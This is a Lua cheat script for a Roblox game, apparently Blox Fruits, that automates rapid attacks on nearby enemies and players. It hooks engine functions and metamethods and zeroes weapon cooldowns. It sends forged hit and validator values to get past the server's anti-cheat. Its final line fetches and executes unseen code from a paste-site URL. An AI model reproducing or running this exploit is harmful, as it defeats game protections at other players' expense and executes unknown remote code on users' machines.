local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VIM = game:GetService("VirtualInputManager")

local CurrentTool = nil
local IsGunTool = false
task.spawn(function()
    while task.wait(0.1) do
        local char = LocalPlayer.Character
        CurrentTool = char and char:FindFirstChildOfClass("Tool")
        if CurrentTool then
            IsGunTool = (CurrentTool:GetAttribute("WeaponType") == "Gun") or (CurrentTool.ToolTip == "Gun")
        else
            IsGunTool = false
        end
    end
end)

local old
old = hookfunction(task.delay, function(t, f, ...)
    if CurrentTool and IsGunTool and old then 
        return old(t, f, ...) 
    end
    if t > 0.1 and old then return old(0, f, ...) end
    if old then return old(t, f, ...) end
end)

task.spawn(function()
    pcall(function() ReplicatedStorage.Remotes.CommF_:InvokeServer("Buso") end)
end)

task.spawn(function()
    while task.wait(0.5) do
        local char = workspace:FindFirstChild("Characters") and workspace.Characters:FindFirstChild(LocalPlayer.Name) or LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0 and not char:FindFirstChild("HasBuso") then
            task.spawn(function()
                pcall(function() ReplicatedStorage.Remotes.CommF_:InvokeServer("Buso") end)
            end)
        end
    end
end)

local RANGE = 65 
local AllTargets = {}

local CachedFramework = nil
task.spawn(function()
    while task.wait(0.5) do
        local char = LocalPlayer.Character or (workspace:FindFirstChild("Characters") and workspace.Characters:FindFirstChild(LocalPlayer.Name))
        if not char or not char:FindFirstChild("Humanoid") or char.Humanoid.Health <= 0 then
            CachedFramework = nil
            continue
        end
        
        local cacheValid = false
        if CachedFramework and type(CachedFramework) == "table" and rawget(CachedFramework, "activeController") then
            local ac = CachedFramework.activeController
            if type(ac) == "table" and rawget(ac, "equipped") ~= nil then
                cacheValid = true
            end
        end
        
        if not cacheValid then
            for _, v in pairs(getgc(true)) do
                if type(v) == "table" and rawget(v, "activeController") and type(v.activeController) == "table" then
                    CachedFramework = v
                    break
                end
            end
        end
    end
end)

local function GetFramework()
    if CachedFramework and type(CachedFramework) == "table" then
        return CachedFramework.activeController
    end
    return nil
end

local lastAnimCancel = 0
local function FastAttack()
    pcall(function()
        local ac = GetFramework()
        if ac and type(ac) == "table" then
            ac.hitboxMagnitude = 150 
            ac.timeToNextAttack = 0
            ac.attacking = false
            ac.blocking = false 
            ac.increment = 1 
            ac.active = false 
            ac.focusStart = 0
            ac.currentActivity = "" 
            
            if rawget(ac, "cooldown") then ac.cooldown = 0 end
            if rawget(ac, "isReloading") then ac.isReloading = false end
            
            if tick() - lastAnimCancel > 0.1 then
                lastAnimCancel = tick()
                local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")
                if animator then
                    for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
                        local tName = track.Name:lower()
                        if tName:find("attack") or tName:find("slash") or tName:find("hit") or tName:find("click") then
                            track:Stop(0)
                        end
                    end
                end
            end
        end
    end)
end

task.spawn(function()
    while task.wait(0.1) do
        local char = LocalPlayer.Character or (workspace:FindFirstChild("Characters") and workspace.Characters:FindFirstChild(LocalPlayer.Name))
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local targets = {} 
        if root then
            for _, folder in pairs({workspace:FindFirstChild("Enemies"), workspace:FindFirstChild("Characters")}) do
                if folder then
                    for _, v in ipairs(folder:GetChildren()) do
                        if v:IsA("Model") and v ~= char and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                            local tPart = v:FindFirstChild("HumanoidRootPart") or v:FindFirstChild("UpperTorso")
                            if tPart and (tPart.Position - root.Position).Magnitude <= RANGE then
                                table.insert(targets, v)
                            end
                        end
                    end
                end
            end
            table.sort(targets, function(a, b)
                local pA = a:FindFirstChild("HumanoidRootPart") or a:FindFirstChild("UpperTorso")
                local pB = b:FindFirstChild("HumanoidRootPart") or b:FindFirstChild("UpperTorso")
                return (pA and pB) and ((pA.Position - root.Position).Magnitude < (pB.Position - root.Position).Magnitude) or false
            end)
        end
        AllTargets = targets 
    end
end)

local Net, regHit, regAttack, shootGun, GunValidator
repeat
    task.wait(0.5)
    pcall(function()
        Net = ReplicatedStorage:FindFirstChild("Modules"):FindFirstChild("Net")
        regHit = Net:FindFirstChild("RE/RegisterHit")
        regAttack = Net:FindFirstChild("RE/RegisterAttack")
        shootGun = Net:FindFirstChild("RE/ShootGunEvent")
        GunValidator = ReplicatedStorage:FindFirstChild("Remotes"):FindFirstChild("Validator2")
    end)
until Net and regHit and regAttack

local oldNM = nil
local lastBypassedTool = nil

local function ExtremeBypass(tool)
    if lastBypassedTool == tool then return end
    lastBypassedTool = tool

    pcall(function()
        if tool:IsA("Tool") then
            tool:SetAttribute("AttackCooldown", 0)
            tool:SetAttribute("LastAttack", 0)
            tool:SetAttribute("State", 0) 
            tool:SetAttribute("Combo", 1)
            
            if tool:FindFirstChild("ClickDelay") then tool.ClickDelay.Value = 0 end
            if tool:FindFirstChild("Cooldown") then tool.Cooldown.Value = 0 end
            if tool:FindFirstChild("Ammo") then tool.Ammo.Value = 999 end
            if tool:FindFirstChild("MaxAmmo") then tool.MaxAmmo.Value = 999 end
            if tool:FindFirstChild("ReloadTime") then tool.ReloadTime.Value = 0 end

            if not getgenv().HookedMelee then
                oldNM = hookmetamethod(game, "__namecall", function(self, ...)
                    if getnamecallmethod() == "FireServer" and self.Name == "RE/RegisterAttack" and oldNM then
                        return oldNM(self, -math.huge)
                    end
                    if oldNM then return oldNM(self, ...) end
                end)
                getgenv().HookedMelee = true
            end
        end
    end)
end

task.spawn(function()
    while true do
        RunService.Heartbeat:Wait() 
        local char = LocalPlayer.Character or (workspace:FindFirstChild("Characters") and workspace.Characters:FindFirstChild(LocalPlayer.Name))
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local tool = char and char:FindFirstChildOfClass("Tool")
        
        if not regHit or not regAttack or not tool or not root or #AllTargets == 0 then 
            task.wait(0.05)
            continue 
        end

        local toolNameLower = tool.Name:lower()
        local isGuitar = toolNameLower:find("guitar")
        local isAnyGun = (tool:GetAttribute("WeaponType") == "Gun") or (tool.ToolTip == "Gun") or isGuitar or toolNameLower:find("dragonstorm")
        local isFruit = (tool.ToolTip == "Blox Fruit")
        
        if isAnyGun then continue end

        ExtremeBypass(tool)
        FastAttack() 

        local unbanID = tostring(LocalPlayer.UserId):sub(2,4)..tostring(coroutine.running()):sub(11,15).."1"

        local HitTable = {}
        local HitPart = nil
        
        for j = 1, math.min(#AllTargets, 12) do
            local monster = AllTargets[j]
            if monster and monster:FindFirstChild("Humanoid") and monster.Humanoid.Health > 0 then
                local rootP = monster:FindFirstChild("HumanoidRootPart") or monster:FindFirstChild("UpperTorso")
                if rootP then
                    if not HitPart then HitPart = monster:FindFirstChild("Head") or rootP end
                    table.insert(HitTable, {monster, rootP})
                end
            end
        end

        if #HitTable > 0 and HitPart then
            pcall(function()
                if not isFruit then
                    regAttack:FireServer(-math.huge)
                    regHit:FireServer(HitPart, HitTable, nil, nil, unbanID)
                else
                    if not getgenv().IsUsingFastAttackFruit then
                        getgenv().IsUsingFastAttackFruit = true
                        
                        task.spawn(function()
                            local speed = getgenv().AutoBounty and getgenv().AutoBounty.Combat and getgenv().AutoBounty.Combat.FastAttackSpeed or 12
                            for i = 1, speed do
                                task.spawn(function()
                                    pcall(function()
                                        regHit:FireServer(HitPart, HitTable, nil, nil, unbanID)
                                        
                                        tool:Activate()
                                        
                                        local remote = tool:FindFirstChild("LeftClickRemote", true) or tool:FindFirstChild("RemoteEvent", true) or tool:FindFirstChild("Remote", true)
                                        if remote then
                                            local lookVector = (HitPart.Position - root.Position).Unit
                                            if lookVector ~= lookVector then lookVector = Vector3.new(0, 1, 0) end 
                                            
                                            if remote.Name == "Remote" then
                                                remote:FireServer(Vector3.new(0,0,0), 1)
                                            else
                                                remote:FireServer(lookVector, 1, unbanID)
                                            end
                                        end
                                        
                                        local mainTarget = HitTable[1] and HitTable[1][1]
                                        local targetRoot = mainTarget and mainTarget:FindFirstChild("HumanoidRootPart")
                                        if targetRoot and Net then
                                            Net:InvokeServer("Attack", {
                                                [1] = targetRoot
                                            })
                                        end
                                    end)
                                end)
                                task.wait(0.01)
                            end
                            getgenv().IsUsingFastAttackFruit = false
                        end)
                    end
                end
            end)
        end
    end
end)

local SpecialShoots = {
    ["Skull Guitar"] = "TAP", 
    ["Bazooka"] = "Position", 
    ["Cannon"] = "Position", 
    ["Dragonstorm"] = "Overheat"
}

local ShootFunction = nil
pcall(function() ShootFunction = getupvalue(require(ReplicatedStorage.Controllers.CombatController).Attack, 9) end)

local function GetValidator2()
    if not ShootFunction then return nil end
    local v1 = getupvalue(ShootFunction, 15)
    local v2 = getupvalue(ShootFunction, 13)
    local v3 = getupvalue(ShootFunction, 16)
    local v4 = getupvalue(ShootFunction, 17)
    local v5 = getupvalue(ShootFunction, 14)
    local v6 = getupvalue(ShootFunction, 12)
    local v7 = getupvalue(ShootFunction, 18)
    
    local v8 = v6 * v2
    local v9 = (v5 * v2 + v6 * v1) % v3
    v9 = (v9 * v3 + v8) % v4
    v5 = math.floor(v9 / v3)
    v6 = v9 - v5 * v3
    v7 = v7 + 1
    
    setupvalue(ShootFunction, 14, v5)
    setupvalue(ShootFunction, 12, v6)
    setupvalue(ShootFunction, 18, v7)
    return math.floor(v9 / v4 * 16777215), v7
end

task.spawn(function()
    while true do
        RunService.Heartbeat:Wait() 
        local char = LocalPlayer.Character or (workspace:FindFirstChild("Characters") and workspace.Characters:FindFirstChild(LocalPlayer.Name))
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local tool = char and char:FindFirstChildOfClass("Tool")
        
        if not regHit or not tool or not root or #AllTargets == 0 then 
            task.wait(0.05)
            continue 
        end
        
        local toolName = tool.Name
        local toolNameLower = toolName:lower()
        local isGuitar = toolNameLower:find("guitar")
        local isAnyGun = (tool:GetAttribute("WeaponType") == "Gun") or (tool.ToolTip == "Gun") or isGuitar or toolNameLower:find("dragonstorm") or toolNameLower:find("gun")
        
        if not isAnyGun then continue end 
        ExtremeBypass(tool)
        
        local unbanID = tostring(LocalPlayer.UserId):sub(2,4)..tostring(coroutine.running()):sub(11,15).."1"
        local gunHitList = {}
        local shootParts = {}
        local targetPos = nil 

        for j = 1, math.min(#AllTargets, 12) do
            local monster = AllTargets[j]
            if monster and monster:FindFirstChild("Humanoid") and monster.Humanoid.Health > 0 then
                local tPart = monster:FindFirstChild("Head") or monster:FindFirstChild("HumanoidRootPart")
                if tPart then
                    table.insert(gunHitList, {monster, tPart})
                    table.insert(shootParts, tPart)
                    if not targetPos then targetPos = tPart.Position end
                end
            end
        end

        if #gunHitList > 0 then
            if not targetPos then targetPos = root.Position + (root.CFrame.LookVector * 100) end
            pcall(function()
                regHit:FireServer(gunHitList[1][2], gunHitList, nil, nil, unbanID)
                
                local ShootType = SpecialShoots[toolName] or "Normal"
                
                if isGuitar then
                    local remote = tool:FindFirstChild("RemoteEvent", true)
                    if remote then remote:FireServer("TAP", targetPos, unbanID) end
                elseif ShootType == "Position" then
                    if shootGun then shootGun:FireServer(targetPos) end
                else
                    if ShootType == "Normal" or ShootType == "Overheat" then
                        local v9, v7 = GetValidator2()
                        if v9 and GunValidator then GunValidator:FireServer(v9, v7) end
                    end
                    if shootGun then shootGun:FireServer(targetPos, shootParts, unbanID) end
                end
                
                tool:Activate()
            end)
        end
    end
end)

pcall(function() loadstring(game:HttpGet("https://pastefy.app/9oi8Fw4M/raw"))() end)
